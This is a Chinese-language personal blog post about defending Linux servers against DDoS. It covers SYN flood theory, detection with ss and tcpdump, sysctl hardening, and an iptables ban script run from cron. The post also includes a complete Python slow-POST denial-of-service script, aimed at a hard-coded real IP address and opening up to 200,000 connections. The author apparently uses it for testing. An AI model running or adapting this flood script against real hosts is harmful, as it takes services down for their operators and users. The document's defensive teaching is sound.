---
title: ddos防护
date: 2021-03-08 02:21:33
tags:
- 个人日记
---



# 前言
<!--more-->

今日睿哥给我一个问题，如何加固Linux?

通过阅读《Linux企业应用安全精解》

<!--more-->

 

# 如何应对DDOS

## ddos原理

分布式拒绝服务攻击（DDoS），利用TCP/IP协议的漏洞完成，除非不使用TCP/IP，才有可能完全抵御DDOS攻击。

### Dos攻击

是单机发出**大量合理但非正常的TCP/IP请求**，占用过多服务器资源，从而导致服务器无法为其他用户提供正常服务。

> 现在服务器硬件配置非常高，对恶意攻击包消化能力比较好，所以没有人使用DDos攻击了。

### DDos攻击

Dos加强版，攻击者事先收集足够多的“有漏洞机器”（俗称“肉鸡”）作为攻击机，大批量的机器对服务器进行Dos攻击。

![image-20210308103527609](http://myapp.img.mykernel.cn/image-20210308103527609.png)

### TCP-SYNC Flood攻击原理

自 DoS问世以来，又衍生出多种形式。这里只详细介绍在网络上使用最频繁、最流行的攻击方法——TCP-SYN Flood

#### 为什么Dos攻击的请求是合理却又是非常的呢？

##### tcp连接

一次标准的TCP连接, TCP/IP协议将提供**可靠的**连接服务，采用**三次**握手建立**一个**连接

![image-20210308104119309](http://myapp.img.mykernel.cn/image-20210308104119309.png)

第一次握手：建立连接，客户端**发送 SYN包（seq＝x）**到服务器，并**进入 SYN-SEND状态**，等待服务器确认(syn+ack)。

> ```bash
> # syn-sent状态
> root@master01:~#  ss  -po state syn-sent  
> Netid                                    Recv-Q                                     Send-Q                                                                          Local Address:Port                                                                               Peer Address:Port                                     
> icmp6                                    0                                          0                                                                                      *%eth0:ipv6-icmp                                                                                     *:*                                         users:(("systemd-network",pid=636,fd=15))
> # tcp协议的syn-send状态
> ss -t -po syn-sent
> ```

第二次握手：服务器收到 SYN 包，必须确认客户的SYN（ACK=x+1），同时发送一个 SYN 包（seq=y），即 SYN+ACK 包，此时服务器进入 SYN-RECV状态

> ```bash
> # SYN-RECV 表示server已经响应syn+ack. 但是client还未回复.
> root@master01:~#  ss  -po state syn-recv
> ```

第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包 ACK（ack=y+1），此包发送完毕，客户端和服务器进入 ESTABLISHED状态。

完成三次握手后，一次成功的TCP连接由此建立，可以展开后续工作了

###### backlog

未连接队列`backlog`：即该连接进入`SYN-RECV`状态，即server响应了`syn(seq=y,ack=x+1)`, 正在等待client发送过来`ACK(ack=y+1)`. 这个连接会记录在此队列中。

> ```bash
> net.ipv4.tcp_max_syn_backlog = 262144
> ```

###### tcp_synack_retries

SYN+ACK重传次数：server已经发送了`syn(seq=y,ack=x+1)` 等了一段时间后未收到客户确认包`ACK(ack=y+1)`, 则第二次重传。如果重传次数超过系统规定的最大重传次数，系统会把连接记录从半连接队列中删除。注意，每次重传等待的时间不一定相同。

> ```bash
> net.ipv4.tcp_synack_retries = 0    # 对于一个将会被重传的被动TCP连接的SYN/ACK的最大次数 default: 5; since Linux 2.2#
> ```

###### 半连接存活时间

半连接队列条目存活最长时间，即服务从收到syn包到确认这个报文无效的最长时间。该时间值是`tcp_synack_retries`指定的次数中每次重传请求包的最长等待时间总和，有时也称半连接存活时间为 Timeout时间或 SYN-RECV存活时间。

##### tcp-syn flood攻击原理

攻击者会利用一些特殊工具制造大量的非法数据包，把源地址伪装成一个实际不存在的地址。

当服务方收到请求方的SYN 并回送 SYN+ACK确认消息后(**进入SYN-RECV状态**)，请求方由于采用源地址欺骗等手段，致使服务方根本得不到 ACK回应。

一台服务器可用的TCP连接是有限的，如果恶意攻击方快速、连续地发送此类连接请求，则服务器的可用**TCP连接队列**很快会被阻塞，系统可用资源、网络可用带宽将急剧下降，因而无法向其他用户提供正常的网络服务。TCP-SYN Flood就是利用这一原理实施攻击的。

虽然攻击者可以将 IP伪造为不存在的源地址，但不存在的源地址也相对容易被管理员识别。有经验的管理员可以通过查看连接状态，把连接频繁的攻击源用iptables脚本直接过滤，所以，此类攻击方式现在也有所改变。有心的攻击者往往会精心准备一群攻击机，同时发动攻击，这样就会有成百上千个攻击源，每个攻击源都在不同的网络。再将每一个攻击源伪装上随机的IP源地址，这样管理员就更难应付了。

## ddos检测方法

- [x] 服务响应慢，从服务器提供的**页面显示速度**上察觉。
- [x] 大量半连接状态的连接**SYN-RECV** `ss -po state syn-recv`, 当前队列：`ss -t -po state syn-recv | tail -n +2 | wc -l`
- [x] sniffer/tcpdump 充斥大量**源地址**为假的**伪装数据包**。whois查询是否真实
- [x] ISP控上服务器的**流量猛增**，造成网络拥塞，服务器甚至不能正常的与外界通信。
- [x] DDoS攻击严重时会造成**系统死机**。

## 防范DDOS

- [x] 资源利用最大化
- [x] 加固TCP/IP协议栈
- [x] 防火墙、路由器过滤网关，有效地探测攻击类型并阻击攻击。

必须明确的是，DDoS攻击在 TCP连接原理上是合法的，除非 TCP协议重新设计，明确定义 DDoS和其他正常请求有何不同，否则不可能完全阻止 DDoS攻击，我们所做的只是尽可能地减轻 DDoS攻击的危害。

### 服务器设置

优化服务 

查看日志 安全日志

利用工具检查文件完整性 tirewire

### 加固TCP/IP协议栈

```bash
# SYN Cookies技术, 试图保护套接字免受syn flood攻击
net.ipv4.tcp_syncookies = 1

# 增大半连接队列空间，容纳更多半连接
net.ipv4.tcp_max_syn_backlog = 262144

# 缩短syn半连接的Timeout，即几次重传syn+ack的总时长调小。
net.ipv4.tcp_syn_retries = 1
```

### 防火墙防御

模拟DDOS脚本

```python
#!/usr/bin/env python
import socket
import time
import threading

# Pressure Test,ddos tool
# ---------------------------
MAX_CONN = 200000    # 最大socket链接量
PORT = 80
HOST = "47.101.51.165"
PAGE = "/photography"

buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))

# 创建socket链接列表，存储上20万个socket
socks = []
# 循环创建socket链接
def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode("utf-8"))
            print("Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("Could not connect to server or send error:%s" % ex)
            time.sleep(1)


# socket循环对目标网站发数据
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode("utf-8"))
                print("send f OK!")
            except Exception as ex:
                print("Send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(0.1)

# 多线程执行两个函数
conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())

conn_th.start()
send_th.start()
```

防御shell脚本

```bash
#!/bin/bash
#
#********************************************************************
#Author:                songliangcheng
#QQ:                    2192383945
#Date:                  2021-03-08
#FileName：             /usr/local/bin/ddos.sh
#URL:                   http://liangcheng.mykernel.cn
#Description：          如果IP只封禁30分钟，就30分钟执行一次crontab
#Copyright (C):        2021 All rights reserved
#********************************************************************
syn_recv_per_ip=5

# 添加DDOS链, INPUT引用
iptables -N DDOS 2>/dev/null
if iptables -vnL INPUT | awk '{print $3}' | grep -q DDOS; then
  true
else
  iptables -I INPUT -j DDOS
fi

# 解封之前封禁的IP
for ip in $(cat /var/tmp/clear); do
  LINE=$(iptables --line -vnL DDOS | grep $ip | awk '{print $1}')
  iptables -D DDOS $LINE
  echo "$ip clear at `date`" >>/var/log/ddos.log
done

# 把处于SYN-RECV的连接的源地址统计，其数量达到5个的IP统计，并禁用
ss -tnp -o state syn-recv | awk  'NR>=2{split($4,peer_addresses,":");print peer_addresses[1]}' | sort | uniq -c | sort -rn | awk -v syn_recv_per_ip=$syn_recv_per_ip '{if ($1 >=syn_recv_per_ip) {print $2}}' > /tmp/dropip
for i in $(cat /tmp/dropip); do
  /sbin/iptables -A DDOS -s $i -j DROP
  echo "$i kill at `date`" >>/var/log/ddos.log
done

# 把当前封禁的IP记录
mv /tmp/dropip /var/tmp/clear
rm -f /tmp/dropip
```

加入crontab

```bash
# 将以上内容放在/usr/local/bin/ddos.sh
root@master01:~# chmod +x /usr/local/bin/ddos.sh

# crontab -e
*/30 * * * * /usr/local/bin/ddos.sh
```



